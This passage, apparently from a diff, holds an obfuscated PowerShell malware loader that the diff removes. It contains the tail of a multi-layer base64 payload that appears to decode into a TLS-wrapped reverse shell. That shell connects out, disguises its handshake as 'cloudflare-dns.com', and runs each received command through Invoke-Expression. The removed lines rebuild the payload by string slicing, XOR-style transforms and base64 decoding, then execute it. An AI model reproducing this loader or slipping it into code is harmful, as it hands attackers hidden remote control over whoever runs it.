pYY3RUMkpxWldOMElFNWxkQzVUYjJOclpYUnpMbFJEVUVOc2FXVnVkQTBLSUNBZ0lDQWdJQ0FrWTJ4cExrTnZibTVsWTNRb0pGZHFaa2wzU2pReU1EUXlNRFk1Tmprc0pGZDFjbk4wVTJGdVpIZHBZMmcwTWpBcERRb2dJQ0FnSUNBZ0lDUnVaWFJUZEhKbFlXMDlKR05zYVM1SFpYUlRkSEpsWVcwb0tRMEtJQ0FnSUNBZ0lDQWtjM05zUFU1bGR5MVBZbXBsWTNRZ1RtVjBMbE5sWTNWeWFYUjVMbE56YkZOMGNtVmhiU2drYm1WMFUzUnlaV0Z0TENSbVlXeHpaU3dvZXlSMGNuVmxmU0F0WVhNZ1cwNWxkQzVUWldOMWNtbDBlUzVTWlcxdmRHVkRaWEowYVdacFkyRjBaVlpoYkdsa1lYUnBiMjVEWVd4c1ltRmphMTBwS1EwS0lDQWdJQ0FnSUNBa2MzTnNMa0YxZEdobGJuUnBZMkYwWlVGelEyeHBaVzUwS0NkamJHOTFaR1pzWVhKbExXUnVjeTVqYjIwbkxDUnVkV3hzTENSemMyeFFjbTkwYnl3a1ptRnNjMlVwRFFvZ0lDQWdJQ0FnSUdsbUtDMXViM1FnS0NSemMyd3VTWE5GYm1OeWVYQjBaV1FnTFdGdVpDQWtjM05zTGtselUybG5ibVZrS1NsN0lDUnpjMnd1UTJ4dmMyVW9LVHNrWTJ4cExrTnNiM05sS0NrN1UzUmhjblF0VTJ4bFpYQWdOVHRqYjI1MGFXNTFaU0I5RFFvTkNpQWdJQ0FnSUNBZ0pITjNQVTVsZHkxUFltcGxZM1FnU1U4dVUzUnlaV0Z0VjNKcGRHVnlLQ1J6YzJ3cERRb2dJQ0FnSUNBZ0lDUnpkeTVCZFhSdlJteDFjMmc5SkhSeWRXVU5DaUFnSUNBZ0lDQWdWM0pwZEdVdFUzUnlaV0Z0SUNSemR5QW5KdzBLRFFvZ0lDQWdJQ0FnSUNSaWRXWTlUbVYzTFU5aWFtVmpkQ0JDZVhSbFcxMGdOREE1TmcwS0lDQWdJQ0FnSUNCM2FHbHNaU2drZEhKMVpTbDdEUW9nSUNBZ0lDQWdJQ0FnSUNCMGNubDdEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdKSEk5SkhOemJDNVNaV0ZrS0NSaWRXWXNNQ3drWW5WbUxreGxibWQwYUNrTkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCcFppZ2tjaUF0YkdVZ01DbDdkR2h5YjNjZ0luZ2lmUTBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ1JqYldROUtGdFVaWGgwTGtWdVkyOWthVzVuWFRvNlZWUkdPQ2t1UjJWMFUzUnlhVzVuS0NSaWRXWXNNQ3drY2lrdVZISnBiU2dwRFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnYVdZb1czTjBjbWx1WjEwNk9rbHpUblZzYkU5eVJXMXdkSGtvSkdOdFpDa3BlMWR5YVhSbExWTjBjbVZoYlNBa2MzY2dKeWM3WTI5dWRHbHVkV1Y5RFFvTkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBaklGTmphSFYwZWlCMmIzSWdaR2x5Wld0MFpXMGdTVVZZSUcxcGRDQjNhR2wwWld4cGMzUWdLR3RsYVc0Z1lYVjBiMjFoZEdselkyaGxjeUJCZFhObXc3eG9jbVZ1S1EwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdsbUtDUmpiV1FnTFcxaGRHTm9JQ2RlWEhNcWFXVjRYSE1ySnlsN0RRb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ1J2ZFhROUlrbHVkbTlyWlMxRmVIQnlaWE56YVc5dUlHbHpkQ0JrWldGcmRHbDJhV1Z5ZEM0aURRb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2ZTQmxiSE5sSUhzTkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdkSEo1ZXlSdmRYUTlTVzUyYjJ0bExVVjRjSEpsYzNOcGIyNGdKR050WkNBeVBpWXhJSHdnVDNWMExWTjBjbWx1WjMxallYUmphSHNrYjNWMFBTUmZMa1Y0WTJWd2RHbHZiaTVOWlhOellXZGxmUTBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSDBOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JYY21sMFpTMVRkSEpsWVcwZ0pITjNJQ1J2ZFhRTkNpQWdJQ0FnSUNBZ0lDQWdJSDFqWVhSamFIdGljbVZoYTMwTkNpQWdJQ0FnSUNBZ2ZRMEtEUW9nSUNBZ0lDQWdJQ1J6ZHk1RGJHOXpaU2dwRFFvZ0lDQWdJQ0FnSUNSemMyd3VRMnh2YzJVb0tRMEtJQ0FnSUNBZ0lDQWtibVYwVTNSeVpXRnRMa05zYjNObEtDa05DaUFnSUNBZ0lDQWdKR05zYVM1RGJHOXpaU2dwRFFvZ0lDQWdmV05oZEdOb2UzME5DaUFnSUNCVGRHRnlkQzFUYkdWbGNDQTFEUXA5RFFvPSIgDQoNCiRzMSA9ICR6dXRhdC5TdWJzdHJpbmcoMCwgNCkNCiRzMiA9ICR6dXRhdC5TdWJzdHJpbmcoNCwgNSkNCiRzMyA9ICR6dXRhdC5TdWJzdHJpbmcoOSwgNCkNCiRzNCA9ICR6dXRhdC5TdWJzdHJpbmcoMTMsIDYpDQokczUgPSAkenV0YXQuU3Vic3RyaW5nKDE5LCAzKQ0KJHM2ID0gJHp1dGF0LlN1YnN0cmluZygyMiwgNSkNCiRzNyA9ICR6dXRhdC5TdWJzdHJpbmcoMjcpDQoNCiRnZWtvY2h0ID0gJHMxICsgJHMyICsgJHMzICsgJHM0ICsgJHM1ICsgJHM2ICsgJHM3DQoNCiRiID0gW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRnZWtvY2h0KQ0KJGMgPSBbc3RyaW5nXVttYXRoXTo6Um91bmQoW21hdGhdOjpQb3coKFIxKSwxMCkpDQokZCA9IFtUZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkYykNCiRlID0gJGRbKCRkLkxlbmd0aC0xKS4uMF0NCg0KJGYxID0gUjIgLXggJGIgLXkgJGQNCiRmMiA9IFIyIC14ICRmMSAteSAkZQ0KJGcgPSBbVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKCRmMikNCg0KJGggPSBSMiAteCAoW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRnKSkgLXkgJGUNCiRpID0gUjIgLXggJGggLXkgJGQNCiRqID0gW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZygkaSkNCiRrID0gW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRqKQ0KJGwgPSBbVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKCRrKQ0KDQpJbnZva2UtRXhwcmVzc2lvbiAkbA==" 
-
-$s1 = $zutat.Substring(0, 4)
-$s2 = $zutat.Substring(4, 5)
-$s3 = $zutat.Substring(9, 4)
-$s4 = $zutat.Substring(13, 6)
-$s5 = $zutat.Substring(19, 3)
-$s6 = $zutat.Substring(22, 5)
-$s7 = $zutat.Substring(27)
-
-$gekocht = $s1 + $s2 + $s3 + $s4 + $s5 + $s6 + $s7
-
-$b = [Text.Encoding]::UTF8.GetBytes($gekocht)
-$c = [string][math]::Round([math]::Pow((R1),10))
-$d = [Text.Encoding]::UTF8.GetBytes($c)
-$e = $d[($d.Length-1)..0]
-
-$f1 = R2 -x $b -y $d
-$f2 = R2 -x $f1 -y $e
-$g = [Text.Encoding]::UTF8.GetString($f2)
-
-$h = R2 -x ([Text.Encoding]::UTF8.GetBytes($g)) -y $e
-$i = R2 -x $h -y $d
-$j = [Text.Encoding]::UTF8.GetString($i)
-$k = [Convert]::FromBase64String($j)
-$l = [Text.Encoding]::UTF8.GetString($k)
-
-Invoke-Expression $l
